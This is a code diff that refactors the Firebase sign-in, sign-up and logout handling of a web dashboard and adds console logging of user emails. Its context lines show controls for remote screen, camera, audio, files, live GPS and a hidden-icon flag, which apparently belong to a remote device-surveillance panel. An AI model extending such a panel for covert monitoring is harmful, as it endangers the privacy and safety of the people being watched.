@@ -1349,6 +1349,22 @@
         const storage = firebase.storage();
 
         let currentUser = null, selectedDeviceId = null, ws = null, reconnectTimer = null, reconnectAttempts = 0;
+
+        auth.onAuthStateChanged(user => {
+            console.log("Auth state changed:", user ? user.email : "none");
+            currentUser = user; 
+            if (user) {
+                document.getElementById('authContainer').style.display = 'none';
+                loadDevices();
+            } else {
+                document.getElementById('authContainer').style.display = 'flex';
+                document.getElementById('deviceListContainer').style.display = 'none';
+                document.getElementById('sidebar').style.display = 'none';
+                document.getElementById('main').style.display = 'none';
+                isLoginMode = true;
+                renderAuthForm();
+            }
+        });
         let screenPC = null, cameraPC = null, audioPC = null, fileTransfers = {}, mapInstance = null;
         let currentData = [], currentPage = 0, dataType = null, currentPath = "root", selectedFiles = [];
         let screenActive = false, iconHidden = false, flashOn = false, isLoginMode = true, liveGpsActive = false;
@@ -1402,15 +1418,23 @@
                 if (!isLoginMode) {
                     const cf = document.getElementById('authConfirmPassword').value.trim();
                     if (pwd !== cf) { err.innerText = 'Passwords do not match'; btn.innerText = 'Sign Up'; return; }
-                    user = (await auth.createUserWithEmailAndPassword(email, pwd)).user;
-                } else user = (await auth.signInWithEmailAndPassword(email, pwd)).user;
-                currentUser = user;
-                document.getElementById('authContainer').style.display = 'none';
-                document.getElementById('deviceListContainer').style.display = 'flex';
-                loadDevices();
-            } catch (e) { err.innerText = e.message; btn.innerText = isLoginMode ? 'Sign In' : 'Sign Up'; }
+                    console.log("Creating user:", email);
+                    const cred = await auth.createUserWithEmailAndPassword(email, pwd);
+                    user = cred.user;
+                } else {
+                    console.log("Signing in user:", email);
+                    const cred = await auth.signInWithEmailAndPassword(email, pwd);
+                    user = cred.user;
+                }
+                console.log("Auth success:", user.uid);
+                // onAuthStateChanged will handle the UI transitions
+            } catch (e) { 
+                console.error("Auth error:", e);
+                err.innerText = e.message; 
+                btn.innerText = isLoginMode ? 'Sign In' : 'Sign Up'; 
+            }
         }
-        function logout() { auth.signOut().then(() => { document.getElementById('deviceListContainer').style.display = 'none'; document.getElementById('sidebar').style.display = 'none'; document.getElementById('main').style.display = 'none'; document.getElementById('authContainer').style.display = 'flex'; if (ws) ws.close(); selectedDeviceId = null; isLoginMode = true; renderAuthForm(); if (deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval); }); }
+        function logout() { auth.signOut(); if (ws) ws.close(); if (deviceInfoRefreshInterval) clearInterval(deviceInfoRefreshInterval); }
         async function loadDevices() {
             if (!currentUser) return;
             const snap = await db.collection('devices').where('userId', '==', currentUser.uid).get();
